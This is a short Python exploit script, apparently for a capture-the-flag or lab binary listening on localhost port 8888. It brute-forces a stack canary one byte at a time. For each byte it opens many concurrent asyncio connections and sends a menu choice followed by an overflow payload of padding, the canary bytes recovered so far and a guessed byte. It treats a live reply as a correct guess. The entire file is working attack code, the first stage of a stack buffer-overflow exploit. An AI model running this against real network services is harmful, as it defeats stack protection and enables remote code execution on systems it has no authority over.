#-*-coding: utf-8-*-
import asyncio
import socket
from struct import pack, unpack
import pprint
from timeout import timeout

##########################################
def u32(x):
    return unpack('<L', x)[0]
    
def p32(x):
    return pack('<L', x)

def p8(x):
    return pack('B', x)
###########################################


HOST = "127.0.0.1"
PORT = 8888

canary = [0 for i in range(4)]


async def break_canary(i, x):
    reader, writer = await asyncio.open_connection(host=HOST, port=PORT)
    
    try:
        await asyncio.wait_for(reader.readuntil(b">"), timeout=5)
    except:
        print('">" timeout    x : {}'.format(hex(x)))
        writer.close()
        return -1
        
    writer.write(b'4')
    r = await reader.readuntil(b"(y/n) ")
   
    payload = b'1'*0xa
    for j in range(i):
        payload += p8(canary[j])
    payload += p8(x)
    
    writer.write(payload)
    is_alive = await reader.read(1024)
    if is_alive:
        print("{} is {} th byte".format(hex(x), i))
        canary[i] = x
        return 1
    
    writer.close() # close socket
    return 0


async def comain():
    range_pack = [range(0x80), range(0x80, 0x100)]
    for i in range(1, 4):
        for ran in range_pack:
            fts = [asyncio.ensure_future(break_canary(i, x)) for x in ran]
            for f in asyncio.as_completed(fts):
                await f
            if canary[i] != 0:
                break


if __name__=="__main__":
    global loop
    loop = asyncio.get_event_loop()
    loop.run_until_complete(comain())
    loop.close()